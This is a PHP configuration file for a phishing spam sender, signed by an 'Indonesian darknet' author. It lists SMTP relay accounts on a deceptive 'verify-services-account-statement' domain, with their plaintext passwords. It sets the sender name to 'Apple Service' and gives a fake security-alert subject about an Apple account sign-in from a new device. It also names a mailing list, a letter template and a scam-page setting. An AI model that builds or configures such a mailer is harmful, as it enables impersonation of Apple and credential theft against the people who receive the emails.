<?php

//Regards
date_default_timezone_set('Asia/Jakarta');
$date = date('F d, Y, h:i A T');

/* SMTP SETUP */
$smtp_acc = [
    [
        "host"     => "smtp-relay.gmail.com",
        "port"     => "587",
        "username" => "p@verify-services-account-statement.com",
        "password" => "aanjingedan123"
    ],
    [
        "host"     => "smtp-relay.gmail.com",
        "port"     => "587",
        "username" => "c@verify-services-account-statement.com",
        "password" => "aanjingedan123"
    ],
    [
        "host"     => "smtp-relay.gmail.com",
        "port"     => "587",
        "username" => "p@verify-services-account-statement.com",
        "password" => "aanjingedan123"
    ],

];

/* Features SETUP */

$gx_setup = [
    "priority"       => 1,
    "userandom"      => 0,
    "sleeptime"      => 3,
    "replacement"    => 1,
    "filesend"       => 1,
    "userremoveline" => 0,
    "mail_list"      => "file/maillist/hot.txt",
    "fromname"       => "Apple Service",
    "frommail"       => "noreply-summarysuspendupdatelive##randstring##noreply@verify-services-account-statement.com",
    "subject"        => "Re : [New Statement Added] [ Alert Information ] Detected Your Apple Account was signed in to Google Chrome from a new device on ( 30 July 2018 ) [FWD]",
    "msgfile"        => "file/letter/Genaa.html",
    "filepdf"        => "file/attachment/logo.ico",
    "scampage"       => ["http://www.google.com"],
];
// INDONESIAN _ DARKNET - ARTHUR

/*

 █████╗ ██████╗ ████████╗██╗  ██╗██╗   ██╗██████╗
██╔══██╗██╔══██╗╚══██╔══╝██║  ██║██║   ██║██╔══██╗
███████║██████╔╝   ██║   ███████║██║   ██║██████╔╝
██╔══██║██╔══██╗   ██║   ██╔══██║██║   ██║██╔══██╗
██║  ██║██║  ██║   ██║   ██║  ██║╚██████╔╝██║  ██║
╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝
     Come From The deepest darkest
                        Mind With Truly Deepest darkest Secret.
*/